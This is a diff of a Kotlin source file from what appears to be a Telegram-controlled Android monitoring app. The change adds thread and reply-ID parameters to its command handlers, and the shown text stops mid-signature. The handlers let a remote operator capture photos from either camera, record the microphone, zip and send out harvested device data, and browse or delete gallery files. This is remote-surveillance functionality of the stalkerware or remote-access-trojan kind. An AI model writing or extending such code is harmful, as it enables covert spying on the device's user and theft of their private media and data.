@@ -31,6 +31,7 @@ import kotlin.random.Random
  * - إضافة تأكيد استلام الضغطة (answerCallbackQuery) في execute.
  * - تحسين سجلات التشخيص.
  * - ✅ إصلاح invokeTelegramMethod باستخدام الاستدعاء المباشر للدوال الداخلية في TelegramUi بدلاً من الانعكاس المعقد.
+ * - ✅ إضافة معاملات threadId و replyToMessageId لجميع دوال المعالجة لضمان الرد في المواضيع الصحيحة.
  */
 class Commands private constructor(context: Context) {
 
@@ -101,7 +102,7 @@ class Commands private constructor(context: Context) {
         }
 
         /**
-         * ✅ نقطة دخول خارجية لتنفيذ الأوامر (تم تعديلها لاستقبال receivingToken)
+         * ✅ نقطة دخول خارجية لتنفيذ الأوامر (تم تعديلها لاستقبال receivingToken, threadId, replyToMessageId)
          */
         suspend fun ex(
             context: Context,
@@ -110,9 +111,14 @@ class Commands private constructor(context: Context) {
             m: Any?,
             cid: Long,
             cbq: String? = null,
-            receivingToken: String? = null
+            receivingToken: String? = null,
+            threadId: Long = 0L,
+            replyToMessageId: Long = 0L
         ) {
-            getInstance(context).execute(cmd, tg, m, cid, cbq, receivingToken)
+            getInstance(context).execute(
+                cmd, tg, m, cid, cbq, receivingToken,
+                threadId, replyToMessageId
+            )
         }
 
         /**
@@ -434,9 +440,22 @@ class Commands private constructor(context: Context) {
     //  إرسال الملفات النصية
     // ============================================================
 
-    private suspend fun sendTextFile(tg: Any?, chatId: Long, content: String, filename: String, receivingToken: String? = null) {
+    private suspend fun sendTextFile(
+        tg: Any?,
+        chatId: Long,
+        content: String,
+        filename: String,
+        receivingToken: String? = null,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         if (content.isBlank()) {
-            sendTelegramMessage(tg, chatId, "📄 $filename: لا يوجد محتوى", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, chatId, "📄 $filename: لا يوجد محتوى",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
             return
         }
 
@@ -446,7 +465,12 @@ class Commands private constructor(context: Context) {
 
             if (tempFile.length() == 0L) {
                 safeRemove(tempFile)
-                sendTelegramMessage(tg, chatId, "📄 $filename: ملف فارغ", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, chatId, "📄 $filename: ملف فارغ",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 return
             }
 
@@ -459,7 +483,12 @@ class Commands private constructor(context: Context) {
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Send text file error: ${e.message}")
-            sendTelegramMessage(tg, chatId, "📄 $filename:\n${content.take(4000)}", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, chatId, "📄 $filename:\n${content.take(4000)}",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
             safeRemove(tempFile)
         }
     }
@@ -474,7 +503,9 @@ class Commands private constructor(context: Context) {
         m: Any?,
         cid: Long,
         cbq: String? = null,
-        receivingToken: String? = null
+        receivingToken: String? = null,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
     ) {
         try {
             MainActivity.appendLogStatic("⚡ Executing command: '$cmd' from $cid")
@@ -490,33 +521,38 @@ class Commands private constructor(context: Context) {
 
             // ✅ التحقق من الجلسة
             if (!isAuthorized(cid, m)) {
-                sendTelegramMessage(tg, cid, "⚠️ انتهت الجلسة، استخدم /login", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "⚠️ انتهت الجلسة، استخدم /login",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 return
             }
 
             // ✅ معالجة الأوامر الجديدة
             when {
                 // 📸 كاميرا أمامية
-                cmd == "camf_main" -> handleCamera(1, tg, m, cid, receivingToken)
+                cmd == "camf_main" -> handleCamera(1, tg, m, cid, receivingToken, threadId, replyToMessageId)
                 // 📷 كاميرا خلفية
-                cmd == "cam_main" -> handleCamera(0, tg, m, cid, receivingToken)
+                cmd == "cam_main" -> handleCamera(0, tg, m, cid, receivingToken, threadId, replyToMessageId)
                 // 🎙️ تسجيل صوتي
-                cmd == "mic_start" -> handleMic(tg, m, cid, receivingToken)
+                cmd == "mic_start" -> handleMic(tg, m, cid, receivingToken, threadId, replyToMessageId)
                 // 🛡️ فحص وحصاد
-                cmd == "hrv_now" -> handleHarvest(tg, m, cid, receivingToken)
+                cmd == "hrv_now" -> handleHarvest(tg, m, cid, receivingToken, threadId, replyToMessageId)
                 // 🚀 بث فوري
-                cmd == "send_now" -> handleSendNow(tg, m, cid, receivingToken)
+                cmd == "send_now" -> handleSendNow(tg, m, cid, receivingToken, threadId, replyToMessageId)
                 // 🔍 حالة النظام
-                cmd == "sys_status" -> handleSysStatus(tg, m, cid, receivingToken)
+                cmd == "sys_status" -> handleSysStatus(tg, m, cid, receivingToken, threadId, replyToMessageId)
                 // 🔒 قفل الجلسة (خروج)
-                cmd == "ext" -> handleExt(tg, m, cid, receivingToken)
+                cmd == "ext" -> handleExt(tg, m, cid, receivingToken, threadId, replyToMessageId)
                 // 🔄 تحديث النموذج
-                cmd == "update_model_all" -> handleUpdateModel(tg, m, cid, receivingToken)
+                cmd == "update_model_all" -> handleUpdateModel(tg, m, cid, receivingToken, threadId, replyToMessageId)
                 // ♻️ إعادة تشغيل الخدمة
-                cmd == "restart_service_all" -> handleRestartService(tg, m, cid, receivingToken)
+                cmd == "restart_service_all" -> handleRestartService(tg, m, cid, receivingToken, threadId, replyToMessageId)
 
                 // ✅ أوامر المعرض (تحتوي على |)
-                cmd.contains("|") -> handleGalleryCommand(cmd, tg, m, cid, receivingToken)
+                cmd.contains("|") -> handleGalleryCommand(cmd, tg, m, cid, receivingToken, threadId, replyToMessageId)
 
                 // ✅ /login يتم معالجته في TelegramUi
                 cmd.startsWith("/login", ignoreCase = true) -> {
@@ -525,21 +561,38 @@ class Commands private constructor(context: Context) {
 
                 else -> {
                     MainActivity.appendLogStatic("⚠️ Unknown command: '$cmd'")
-                    sendTelegramMessage(tg, cid, "⚠️ أمر غير معروف. استخدم الأزرار التفاعلية.", receivingToken = receivingToken)
+                    sendTelegramMessage(
+                        tg, cid, "⚠️ أمر غير معروف. استخدم الأزرار التفاعلية.",
+                        receivingToken = receivingToken,
+                        threadId = threadId,
+                        replyToMessageId = replyToMessageId
+                    )
                 }
             }
         } catch (e: Exception) {
             MainActivity.appendLogStatic("❌ Command error: ${e.message}")
             Log.e(TAG, "❌ Command error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ: ${e.message?.take(100)}", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ: ${e.message?.take(100)}",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
     // ============================================================
-    //  ✅ دوال معالجة الأوامر الجديدة
+    //  ✅ دوال معالجة الأوامر الجديدة (جميعها تستقبل threadId و replyToMessageId)
     // ============================================================
 
-    private suspend fun handleSysStatus(tg: Any?, m: Any?, cid: Long, receivingToken: String?) {
+    private suspend fun handleSysStatus(
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String?,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
             val status = getModuleComponent(m, "ui")?.let { ui ->
                 invokeMethod(ui, "getStatus") as? Map<*, *>
@@ -558,32 +611,76 @@ class Commands private constructor(context: Context) {
                 🧠 حالة النموذج: ${if (getModuleComponent(m, "nudeDetector") != null) "✅ متاح" else "❌ غير متاح"}
             """.trimIndent()
 
-            sendTelegramMessage(tg, cid, statusText, receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, statusText,
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         } catch (e: Exception) {
             Log.e(TAG, "❌ System status error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في جلب حالة النظام", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في جلب حالة النظام",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
-    private suspend fun handleExt(tg: Any?, m: Any?, cid: Long, receivingToken: String?) {
+    private suspend fun handleExt(
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String?,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
             val ui = getModuleComponent(m, "ui")
             if (ui != null) {
                 val sessions = getModuleField(ui, "sessions") as? ConcurrentHashMap<*, *>
                 sessions?.remove(cid.toString())
-                sendTelegramMessage(tg, cid, "🔒 تم قفل الجلسة بنجاح. استخدم كلمة السر للدخول مجدداً.", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "🔒 تم قفل الجلسة بنجاح. استخدم كلمة السر للدخول مجدداً.",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
             } else {
-                sendTelegramMessage(tg, cid, "⚠️ لا توجد جلسة نشطة.", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "⚠️ لا توجد جلسة نشطة.",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Logout error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في قفل الجلسة", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في قفل الجلسة",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
-    private suspend fun handleUpdateModel(tg: Any?, m: Any?, cid: Long, receivingToken: String?) {
+    private suspend fun handleUpdateModel(
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String?,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
-            sendTelegramMessage(tg, cid, "⚡ جاري تحديث النموذج... قد يستغرق دقائق.", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "⚡ جاري تحديث النموذج... قد يستغرق دقائق.",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
             scope.launch {
                 try {
                     val detector = getModuleComponent(m, "nudeDetector") as? NudeDetector
@@ -592,27 +689,64 @@ class Commands private constructor(context: Context) {
                         if (success) {
                             detector.modelPath = detector.modelPath
                             detector.loadEngineForever()
-                            sendTelegramMessage(tg, cid, "✅ تم تحديث النموذج بنجاح!", receivingToken = receivingToken)
+                            sendTelegramMessage(
+                                tg, cid, "✅ تم تحديث النموذج بنجاح!",
+                                receivingToken = receivingToken,
+                                threadId = threadId,
+                                replyToMessageId = replyToMessageId
+                            )
                         } else {
-                            sendTelegramMessage(tg, cid, "❌ فشل تحديث النموذج.", receivingToken = receivingToken)
+                            sendTelegramMessage(
+                                tg, cid, "❌ فشل تحديث النموذج.",
+                                receivingToken = receivingToken,
+                                threadId = threadId,
+                                replyToMessageId = replyToMessageId
+                            )
                         }
                     } else {
-                        sendTelegramMessage(tg, cid, "❌ كاشف المحتوى غير متاح", receivingToken = receivingToken)
+                        sendTelegramMessage(
+                            tg, cid, "❌ كاشف المحتوى غير متاح",
+                            receivingToken = receivingToken,
+                            threadId = threadId,
+                            replyToMessageId = replyToMessageId
+                        )
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Update model error: ${e.message}")
-                    sendTelegramMessage(tg, cid, "❌ خطأ في تحديث النموذج: ${e.message?.take(50)}", receivingToken = receivingToken)
+                    sendTelegramMessage(
+                        tg, cid, "❌ خطأ في تحديث النموذج: ${e.message?.take(50)}",
+                        receivingToken = receivingToken,
+                        threadId = threadId,
+                        replyToMessageId = replyToMessageId
+                    )
                 }
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Update model handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في تحديث النموذج", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في تحديث النموذج",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
-    private suspend fun handleRestartService(tg: Any?, m: Any?, cid: Long, receivingToken: String?) {
+    private suspend fun handleRestartService(
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String?,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
-            sendTelegramMessage(tg, cid, "♻️ جاري إعادة تشغيل الخدمة...", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "♻️ جاري إعادة تشغيل الخدمة...",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
             scope.launch {
                 try {
                     val monitor = m
@@ -622,97 +756,200 @@ class Commands private constructor(context: Context) {
                         delay(2000)
                         val startMethod = monitor.javaClass.getMethod("start")
                         startMethod.invoke(monitor)
-                        sendTelegramMessage(tg, cid, "✅ تم إعادة تشغيل الخدمة بنجاح.", receivingToken = receivingToken)
+                        sendTelegramMessage(
+                            tg, cid, "✅ تم إعادة تشغيل الخدمة بنجاح.",
+                            receivingToken = receivingToken,
+                            threadId = threadId,
+                            replyToMessageId = replyToMessageId
+                        )
                     } else {
-                        sendTelegramMessage(tg, cid, "❌ وحدة المراقبة غير متاحة", receivingToken = receivingToken)
+                        sendTelegramMessage(
+                            tg, cid, "❌ وحدة المراقبة غير متاحة",
+                            receivingToken = receivingToken,
+                            threadId = threadId,
+                            replyToMessageId = replyToMessageId
+                        )
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Restart service error: ${e.message}")
-                    sendTelegramMessage(tg, cid, "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}", receivingToken = receivingToken)
+                    sendTelegramMessage(
+                        tg, cid, "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}",
+                        receivingToken = receivingToken,
+                        threadId = threadId,
+                        replyToMessageId = replyToMessageId
+                    )
                 }
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Restart service handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في إعادة تشغيل الخدمة", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في إعادة تشغيل الخدمة",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
     // ============================================================
-    //  معالج الكاميرا (معدل لاستقبال receivingToken)
+    //  معالج الكاميرا (معدل لاستقبال receivingToken, threadId, replyToMessageId)
     // ============================================================
 
-    private suspend fun handleCamera(camId: Int, tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
+    private suspend fun handleCamera(
+        camId: Int,
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String? = null,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
             if (!isBatteryOk(m)) {
-                sendTelegramMessage(tg, cid, "🔋 البطارية منخفضة", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "🔋 البطارية منخفضة",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 return
             }
 
             val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer") as? CameraAnalyzer
             if (cameraAnalyzer == null) {
-                sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "❌ الكاميرا غير متاحة",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 return
             }
 
-            sendTelegramMessage(tg, cid, "📸 جاري التقاط الصورة...", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "📸 جاري التقاط الصورة...",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
             sendPulseIntent("📸 Camera")
 
             scope.launch {
                 try {
                     cameraAnalyzer.harvest(camId)
-                    sendTelegramMessage(tg, cid, "✅ تم التقاط الصورة وتحليلها.", receivingToken = receivingToken)
+                    sendTelegramMessage(
+                        tg, cid, "✅ تم التقاط الصورة وتحليلها.",
+                        receivingToken = receivingToken,
+                        threadId = threadId,
+                        replyToMessageId = replyToMessageId
+                    )
                 } catch (e: Exception) {
-                    sendTelegramMessage(tg, cid, "❌ فشل الالتقاط: ${e.message?.take(50)}", receivingToken = receivingToken)
+                    sendTelegramMessage(
+                        tg, cid, "❌ فشل الالتقاط: ${e.message?.take(50)}",
+                        receivingToken = receivingToken,
+                        threadId = threadId,
+                        replyToMessageId = replyToMessageId
+                    )
                 }
             }
         } catch (e: Exception) {
             Log.e(TAG, "Camera handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في الكاميرا", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في الكاميرا",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
     // ============================================================
-    //  معالج المعرض (معدل لاستقبال receivingToken)
+    //  معالج المعرض (معدل لاستقبال threadId و replyToMessageId)
     // ============================================================
 
-    private suspend fun handleGallery(tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
+    private suspend fun handleGallery(
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String? = null,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
             val mediaScanner = getModuleComponent(m, "mediaScanner")
             if (mediaScanner == null) {
-                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "❌ المعرض غير متاح",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 return
             }
 
             val kb = invokeMethod(mediaScanner, "getGridKb", "all", 0)
             if (kb != null) {
-                val response = sendTelegramMessage(tg, cid, "🖼️ أرشيف الوسائط", kb.toString(), receivingToken)
+                val response = sendTelegramMessage(
+                    tg, cid, "🖼️ أرشيف الوسائط", kb.toString(),
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 val msgId = (response as? JSONObject)?.optJSONObject("result")?.optLong("message_id")
                 msgId?.let { setModuleField(m, "last_mid", it) }
             } else {
-                sendTelegramMessage(tg, cid, "❌ فشل تحميل المعرض", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "❌ فشل تحميل المعرض",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
             }
         } catch (e: Exception) {
             Log.e(TAG, "Gallery handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في المعرض", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في المعرض",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
     // ============================================================
-    //  معالج أوامر المعرض (معدل لاستقبال receivingToken)
+    //  معالج أوامر المعرض (معدل لاستقبال threadId و replyToMessageId)
     // ============================================================
 
-    private suspend fun handleGalleryCommand(cmd: String, tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
+    private suspend fun handleGalleryCommand(
+        cmd: String,
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String? = null,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
             val parts = cmd.split("|")
             if (parts.size < 2) {
-                sendTelegramMessage(tg, cid, "⚠️ أمر غير مكتمل", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "⚠️ أمر غير مكتمل",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 return
             }
 
             val action = parts[0]
             val mediaScanner = getModuleComponent(m, "mediaScanner")
             if (mediaScanner == null) {
-                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "❌ المعرض غير متاح",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 return
             }
 
@@ -726,11 +963,13 @@ class Commands private constructor(context: Context) {
                         val newKb = invokeMethod(mediaScanner, "getGridKb", cat, page)
                         if (newKb != null) {
                             val msgId = lastMid ?: 0
-                            invokeTelegramMethod(tg, "editMessageReplyMarkup", mapOf(
-                                "chat_id" to cid,
-                                "message_id" to msgId,
-                                "reply_markup" to newKb.toString()
-                            ), receivingToken)
+                            invokeTelegramMethod(
+                                tg, "editMessageReplyMarkup", mapOf(
+                                    "chat_id" to cid,
+                                    "message_id" to msgId,
+                                    "reply_markup" to newKb.toString()
+                                ), receivingToken, threadId, replyToMessageId
+                            )
                         }
                     }
                 }
@@ -765,7 +1004,12 @@ class Commands private constructor(context: Context) {
                             )
                         )
                         val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
-                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف كل ملفات الصفحة ${page + 1}؟", jsonKb, receivingToken)
+                        sendTelegramMessage(
+                            tg, cid, "⚠️ هل أنت متأكد من حذف كل ملفات الصفحة ${page + 1}؟", jsonKb,
+                            receivingToken = receivingToken,
+                            threadId = threadId,
+                            replyToMessageId = replyToMessageId
+                        )
                     }
                 }
                 "g_conf_del_one" -> {
@@ -780,7 +1024,12 @@ class Commands private constructor(context: Context) {
                             )
                         )
                         val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
-                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb, receivingToken)
+                        sendTelegramMessage(
+                            tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb,
+                            receivingToken = receivingToken,
+                            threadId = threadId,
+                            replyToMessageId = replyToMessageId
+                        )
                     }
                 }
                 "g_toggle" -> {
@@ -799,26 +1048,48 @@ class Commands private constructor(context: Context) {
                     }
                 }
                 else -> {
-                    sendTelegramMessage(tg, cid, "⚠️ أمر معرض غير معروف", receivingToken = receivingToken)
+                    sendTelegramMessage(
+                        tg, cid, "⚠️ أمر معرض غير معروف",
+                        receivingToken = receivingToken,
+                        threadId = threadId,
+                        replyToMessageId = replyToMessageId
+                    )
                 }
             }
         } catch (e: Exception) {
             Log.e(TAG, "Gallery command error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في أمر المعرض", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في أمر المعرض",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
     // ============================================================
-    //  معالج الحصاد (معدل لاستقبال receivingToken)
+    //  معالج الحصاد (معدل لاستقبال threadId و replyToMessageId)
     // ============================================================
 
-    private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
+    private suspend fun handleHarvest(
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String? = null,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
             sendPulseIntent("📦 Data Harvest")
 
             val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
-                sendTelegramMessage(tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 scope.launch {
                     try {
                         invokeMethod(dailyZipper, "run")
@@ -827,22 +1098,44 @@ class Commands private constructor(context: Context) {
                     }
                 }
             } else {
-                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير جاهزة", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "❌ وحدة الحصاد غير جاهزة",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Harvest handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في الحصاد", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في الحصاد",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
     // ============================================================
-    //  معالج الميكروفون (معدل لاستقبال receivingToken)
+    //  معالج الميكروفون (معدل لاستقبال threadId و replyToMessageId)
     // ============================================================
 
-    private suspend fun handleMic(tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
+    private suspend fun handleMic(
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String? = null,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
             if (isMicBusy) {
-                sendTelegramMessage(tg, cid, "⏳ التسجيل قيد التنفيذ", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "⏳ التسجيل قيد التنفيذ",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 return
             }
 
@@ -850,7 +1143,12 @@ class Commands private constructor(context: Context) {
 
             stopRecordingFlag = false
             val duration = (config["audio_duration"] as? Number)?.toInt() ?: 10
-            sendTelegramMessage(tg, cid, "🎤 جاري التسجيل لمدة $duration ثوانٍ...", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "🎤 جاري التسجيل لمدة $duration ثوانٍ...",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
 
             scope.launch {
                 val audioPath = recordAudio(duration)
@@ -864,24 +1162,46 @@ class Commands private constructor(context: Context) {
                         addTaskToQueue("audio", audioPath.absolutePath, target)
                     }
                 } else {
-                    sendTelegramMessage(tg, cid, "❌ فشل التسجيل (الملف صغير جداً أو تالف)", receivingToken = receivingToken)
+                    sendTelegramMessage(
+                        tg, cid, "❌ فشل التسجيل (الملف صغير جداً أو تالف)",
+                        receivingToken = receivingToken,
+                        threadId = threadId,
+                        replyToMessageId = replyToMessageId
+                    )
                 }
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Mic handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في الميكروفون", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في الميكروفون",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
     // ============================================================
-    //  معالج الإرسال الفوري (معدل لاستقبال receivingToken)
+    //  معالج الإرسال الفوري (معدل لاستقبال threadId و replyToMessageId)
     // ============================================================
 
-    private suspend fun handleSendNow(tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
+    private suspend fun handleSendNow(
+        tg: Any?,
+        m: Any?,
+        cid: Long,
+        receivingToken: String? = null,
+        threadId: Long = 0L,
+        replyToMessageId: Long = 0L
+    ) {
         try {
             val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
-                sendTelegramMessage(tg, cid, "🚀 جاري إرسال الملفات المضغوطة فوراً...", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "🚀 جاري إرسال الملفات المضغوطة فوراً...",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
                 scope.launch {
                     try {
                         val success = invokeMethod(dailyZipper, "forceSendNow", cid) as? Boolean
@@ -893,11 +1213,21 @@ class Commands private constructor(context: Context) {
                     }
                 }
             } else {
-                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير متاحة", receivingToken = receivingToken)
+                sendTelegramMessage(
+                    tg, cid, "❌ وحدة الحصاد غير متاحة",
+                    receivingToken = receivingToken,
+                    threadId = threadId,
+                    replyToMessageId = replyToMessageId
+                )
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Send now handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في الإرسال الفوري", receivingToken = receivingToken)
+            sendTelegramMessage(
+                tg, cid, "❌ خطأ في الإرسال الفوري",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         }
     }
 
@@ -976,13 +1306,18 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  دوال الاتصال بـ Telegram API (معدلة لدعم receivingToken)
+    //  دوال الاتصال بـ Telegram API (معدلة لدعم receivingToken, threadId, replyToMessageId)
     // ============================================================
 
     /**
      * إرسال تأكيد استلام الضغطة (answerCallbackQuery)
      */
-    private suspend fun sendAnswerCallbackQuery(tg: Any?, queryId: String, text: String, receivingToken: String? = null) {
+    private suspend fun sendAnswerCallbackQuery(
+        tg: Any?,
+        queryId: String,
+        text: String,
+        receivingToken: String? = null
+    ) {
         val params = mapOf(
             "callback_query_id" to queryId,
             "text" to text,
@@ -993,9 +1328,16 @@ class Commands private constructor(context: Context) {
 
     /**
      * ✅ استدعاء دالة في كائن TelegramUi مع الاستدعاء المباشر للدوال الداخلية
-     * ✅ تم إصلاح المشكلة: الاستدعاء المباشر بدلاً من الانعكاس المعقد للدوال المعلقة
+     * ✅ تم تعديلها لدعم threadId و replyToMessageId
      */
-    private suspend fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>, receivingToken: String? = null): Any? {
+    private suspend fun invokeTelegramMethod(
+        tg: Any?,
+        method: String,
+        params: Map<String, Any>,
+        receivingToken: String? = null,
+        threadId: Long = 0L,
